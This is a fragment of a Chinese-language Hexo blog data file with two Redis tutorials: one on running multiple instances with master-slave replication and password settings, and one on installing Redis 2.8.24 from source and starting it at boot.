class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x542F;&#x52A8;6381&#x7AEF;&#x53E3;&#x670D;&#x52A1;</span></span><br><span class=\"line\">src/redis-server /etc/redis6381.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6309;&#x7AEF;&#x53E3;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class=\"line\">/usr/bin/redis-cli -p 6381</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E09;&#x3001;&#x540C;&#x7406;&#x6211;&#x4EEC;&#x914D;&#x7F6E;6382&#x914D;&#x7F6E;&#x6587;&#x4EF6;, &#x6210;&#x529F;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<hr>\n<h3 id=\"redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\"><a href=\"#redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\" class=\"headerlink\" title=\"redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\"></a>redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;</h3><p>&#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6381.conf</span><br><span class=\"line\">vim /etc/redis/redis6382.conf</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p>&#x91CD;&#x542F;6379&#x3001;6381&#x3001;6382&#x670D;&#x52A1;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5B9E;&#x73B0;&#x540C;&#x6B65;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x767B;&#x5F55;&#x76F8;&#x5173;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8F93;&#x5165;info&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x914D;&#x7F6E;&#x4FE1;&#x606F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x4E3B;&#x673A;</span></span><br><span class=\"line\">127.0.0.1:6379&gt;info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Replication</span></span><br><span class=\"line\">role:master</span><br><span class=\"line\">connected_slaves:1</span><br><span class=\"line\">slave0:ip=&#x4ECE;&#x673A;ip,port=6379,state=online,offset=140933,lag=1</span><br><span class=\"line\">master_repl_offset:140933</span><br><span class=\"line\">repl_backlog_active:1</span><br><span class=\"line\">repl_backlog_size:1048576</span><br><span class=\"line\">repl_backlog_first_byte_offset:2</span><br><span class=\"line\">repl_backlog_histlen:140932</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4ECE;&#x673A;</span></span><br><span class=\"line\">127.0.0.1:6381&gt;info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Replication</span></span><br><span class=\"line\">role:slave</span><br><span class=\"line\">master_host:&#x4E3B;&#x673A;ip</span><br><span class=\"line\">master_port:6379</span><br><span class=\"line\">master_link_status:up</span><br><span class=\"line\">master_last_io_seconds_ago:7</span><br><span class=\"line\">master_sync_<span class=\"keyword\">in</span>_progress:0</span><br><span class=\"line\">slave_repl_offset:141073</span><br><span class=\"line\">slave_priority:100</span><br><span class=\"line\">slave_<span class=\"built_in\">read</span>_only:1</span><br><span class=\"line\">connected_slaves:0</span><br><span class=\"line\">master_repl_offset:0</span><br><span class=\"line\">repl_backlog_active:0</span><br><span class=\"line\">repl_backlog_size:1048576</span><br><span class=\"line\">repl_backlog_first_byte_offset:0</span><br><span class=\"line\">repl_backlog_histlen:0</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\"><a href=\"#redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\" class=\"headerlink\" title=\"redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\"></a>redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;</h3><p>&#x6B63;&#x5F0F;&#x73AF;&#x5883;redis&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x5BC6;&#x7801;&#x7684;&#x914D;&#x7F6E;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x3002;<br>redis&#x5BC6;&#x7801;&#x7F3A;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5F88;&#x5BB9;&#x6613;&#x901A;&#x8FC7;&#x8089;&#x673A;&#x626B;&#x63CF;redis&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x5BC6;&#x767B;&#x5F55;redis&#x8FDB;&#x800C;&#x901A;&#x8FC7;config&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x9020;&#x6210;&#x7834;&#x574F;&#x3002;</p>\n<p>&#x4FEE;&#x6539;6379&#x4E3B;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6379.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;requirepass&#x9879;</span></span><br><span class=\"line\">requirepass master-password</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6381.conf</span><br><span class=\"line\">vim /etc/redis/redis6382.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;requirepass&#x9879;</span></span><br><span class=\"line\">requirepass slave-password</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;masterauth&#x9879;</span></span><br><span class=\"line\">masterauth &lt;master-password&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF0C;&#x6309;&#x7AEF;&#x53E3;&#x6309;&#x5BC6;&#x7801;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;&#x6D4B;&#x8BD5;&#x76F8;&#x5173;&#x6548;&#x679C;&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/redis-cli -p 6382 <span class=\"_\">-a</span> password</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<blockquote>\n<p>&#x524D;&#x63D0;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x597D;&#x4E86;redis,<br>redis&#x5B89;&#x88C5;&#x53EF;&#x641C;&#x7D22;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF1A;redis&#x5B89;&#x88C5;&#x3002;</p>\n</blockquote>\n<h3 id=\"redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\"><a href=\"#redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\" class=\"headerlink\" title=\"redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\"></a>redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;</h3><p>&#x4E00;&#x3001;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x62F7;&#x8D1D;&#x4E24;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/redis.conf /etc/redis6381.conf</span><br><span class=\"line\">cp /etc/redis.conf /etc/redis6382.conf</span><br></pre></td></tr></table></figure>\n<p>&#x4E8C;&#x3001;&#x4FEE;&#x6539;redis6381&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/redis6381.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#x3002;</span></span><br><span class=\"line\">daemonize yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;redis&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x628A; pid &#x9ED8;&#x8BA4;&#x5199;&#x5230; /var/run/redis.pid &#x6587;&#x4EF6;&#x91CC;&#x9762;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x81EA;&#x5DF1;&#x5236;&#x5B9A;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x3002;</span></span><br><span class=\"line\">pidfile /var/run/redis/redis_6381.pid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; 6379&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8BBE;&#x4E3A; 0 &#xFF0C;redis &#x5C06;&#x4E0D;&#x5728; socket &#x4E0A;&#x76D1;&#x542C;&#x4EFB;&#x4F55;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;</span></span><br><span class=\"line\">port 6381</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">logfile /var/<span class=\"built_in\">log</span>/redis/redis_6381.log</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;dump&#x7684;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">dbfilename dump_6381.rdb</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F8B;&#x5982;&#x4E0A;&#x9762;&#x7684; dbfilename &#x53EA;&#x6307;&#x5B9A;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x4F1A;&#x5199;&#x5165;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x4E00;&#x5B9A;&#x662F;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x662F;&#x6587;&#x4EF6;&#x540D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;</span></span><br><span class=\"line\">dir /data/redisdb/</span><br></pre></td></tr></table></figure></p>","more":"<p>&#x76F8;&#x5173;&#x547D;&#x4EE4;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x542F;&#x52A8;6381&#x7AEF;&#x53E3;&#x670D;&#x52A1;</span></span><br><span class=\"line\">src/redis-server /etc/redis6381.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6309;&#x7AEF;&#x53E3;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class=\"line\">/usr/bin/redis-cli -p 6381</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E09;&#x3001;&#x540C;&#x7406;&#x6211;&#x4EEC;&#x914D;&#x7F6E;6382&#x914D;&#x7F6E;&#x6587;&#x4EF6;, &#x6210;&#x529F;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x8FDB;&#x7A0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<hr>\n<h3 id=\"redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\"><a href=\"#redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\" class=\"headerlink\" title=\"redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;\"></a>redis&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;</h3><p>&#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6381.conf</span><br><span class=\"line\">vim /etc/redis/redis6382.conf</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p>&#x91CD;&#x542F;6379&#x3001;6381&#x3001;6382&#x670D;&#x52A1;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5B9E;&#x73B0;&#x540C;&#x6B65;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x767B;&#x5F55;&#x76F8;&#x5173;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8F93;&#x5165;info&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x914D;&#x7F6E;&#x4FE1;&#x606F;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x4E3B;&#x673A;</span></span><br><span class=\"line\">127.0.0.1:6379&gt;info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Replication</span></span><br><span class=\"line\">role:master</span><br><span class=\"line\">connected_slaves:1</span><br><span class=\"line\">slave0:ip=&#x4ECE;&#x673A;ip,port=6379,state=online,offset=140933,lag=1</span><br><span class=\"line\">master_repl_offset:140933</span><br><span class=\"line\">repl_backlog_active:1</span><br><span class=\"line\">repl_backlog_size:1048576</span><br><span class=\"line\">repl_backlog_first_byte_offset:2</span><br><span class=\"line\">repl_backlog_histlen:140932</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4ECE;&#x673A;</span></span><br><span class=\"line\">127.0.0.1:6381&gt;info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Replication</span></span><br><span class=\"line\">role:slave</span><br><span class=\"line\">master_host:&#x4E3B;&#x673A;ip</span><br><span class=\"line\">master_port:6379</span><br><span class=\"line\">master_link_status:up</span><br><span class=\"line\">master_last_io_seconds_ago:7</span><br><span class=\"line\">master_sync_<span class=\"keyword\">in</span>_progress:0</span><br><span class=\"line\">slave_repl_offset:141073</span><br><span class=\"line\">slave_priority:100</span><br><span class=\"line\">slave_<span class=\"built_in\">read</span>_only:1</span><br><span class=\"line\">connected_slaves:0</span><br><span class=\"line\">master_repl_offset:0</span><br><span class=\"line\">repl_backlog_active:0</span><br><span class=\"line\">repl_backlog_size:1048576</span><br><span class=\"line\">repl_backlog_first_byte_offset:0</span><br><span class=\"line\">repl_backlog_histlen:0</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\"><a href=\"#redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\" class=\"headerlink\" title=\"redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;\"></a>redis&#x6DFB;&#x52A0;&#x5BC6;&#x7801;</h3><p>&#x6B63;&#x5F0F;&#x73AF;&#x5883;redis&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x5BC6;&#x7801;&#x7684;&#x914D;&#x7F6E;&#x5FC5;&#x4E0D;&#x53EF;&#x5C11;&#x3002;<br>redis&#x5BC6;&#x7801;&#x7F3A;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5F88;&#x5BB9;&#x6613;&#x901A;&#x8FC7;&#x8089;&#x673A;&#x626B;&#x63CF;redis&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x5BC6;&#x767B;&#x5F55;redis&#x8FDB;&#x800C;&#x901A;&#x8FC7;config&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x9020;&#x6210;&#x7834;&#x574F;&#x3002;</p>\n<p>&#x4FEE;&#x6539;6379&#x4E3B;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6379.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;requirepass&#x9879;</span></span><br><span class=\"line\">requirepass master-password</span><br></pre></td></tr></table></figure></p>\n<p>&#x4FEE;&#x6539;6381&#x3001;6382&#x4ECE;&#x5E93;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/redis/redis6381.conf</span><br><span class=\"line\">vim /etc/redis/redis6382.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;requirepass&#x9879;</span></span><br><span class=\"line\">requirepass slave-password</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4FEE;&#x6539;masterauth&#x9879;</span></span><br><span class=\"line\">masterauth &lt;master-password&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF0C;&#x6309;&#x7AEF;&#x53E3;&#x6309;&#x5BC6;&#x7801;&#x8FDB;&#x5165;&#x5BA2;&#x6237;&#x7AEF;&#x6D4B;&#x8BD5;&#x76F8;&#x5173;&#x6548;&#x679C;&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/redis-cli -p 6382 <span class=\"_\">-a</span> password</span><br></pre></td></tr></table></figure></p>"},{"title":"Redis安装","date":"2016-09-16T14:41:19.000Z","toc":false,"_content":"\n### redis简介\nredis是一个性能非常优秀的内存数据库，通过key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hashs（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n\nRedis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Python，Ruby，Erlang，PHP客户端，使用很方便。redis的安装配置，比较简单，详见官方网站。\n\n### 安装\n\n检查安装依赖程序\n```bash\nyum install gcc-c++\nyum install -y tcl\nyum install wget\n```\n\n获取安装文件\n```bash\nwget http://download.redis.io/releases/redis-2.8.24.tar.gz\n```\n\n解压文件\n```bash\ntar -xzvf redis-2.8.24.tar.gz\nmv redis-2.8.24 redis\ncd redis\n```\n\n<!-- more -->\n\n安装及版本查看\n```bash\n#编译安装\nmake\nmake install\n\n#版本查看\nredis-server --version\n```\n\n设置配置文件路径\n```bash\nmkdir -p /etc/redis\ncp redis.conf /etc/redis\n```\n\n修改配置文件\n```bash\nvim /etc/redis/redis.conf\n\n#仅修改daemonize，no设置为yes，按守护进程启动\n#密码设置、多实例、主从搭建可以查看本站另一篇文章\ndaemonize yes\n```\n\n启动\n```bash\n/usr/local/bin/redis-server /etc/redis/redis.conf\nps -ef | grep redis\n```\n\n使用客户端\n```bash\nredis-cli\n>set name david\nOK\n>get name\n\"david\"\n```\n\nPS：如果要卸载redis，把/usr/local/bin/目录下的redis删除即可。\n为了卸载干净，你还可以把解压和编译的redis包及配置的redis.conf也删除。\n\n---\n\n### 开机自启动\n```bash\necho \"/usr/local/bin/redis-server /etc/redis/redis.conf &\" >> /etc/rc.local\n```\n---\n\n### 相关链接\nredis中文官网：\nhttp://doc.redisfans.com/\n\nreids设计与实现\nhttp://redisbook.readthedocs.org/en/latest/index.html\n\nredis使用场景\nhttp://www.360doc.com/content/15/0510/20/23016082_469494498.shtml\n\nredis conf配置详解\nhttp://www.cnblogs.com/kreo/p/4423362.html","source":"_posts/Redis安装.md","raw":"---\ntitle: Redis安装\ncategories:\n  - 运维部署\ntags:\n  - redis\ndate: 2016-9-16 22:41:19\ntoc: false\n---\n\n### redis简介\nredis是一个性能非常优秀的内存数据库，通过key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hashs（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n\nRedis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Python，Ruby，Erlang，PHP客户端，使用很方便。redis的安装配置，比较简单，详见官方网站。\n\n### 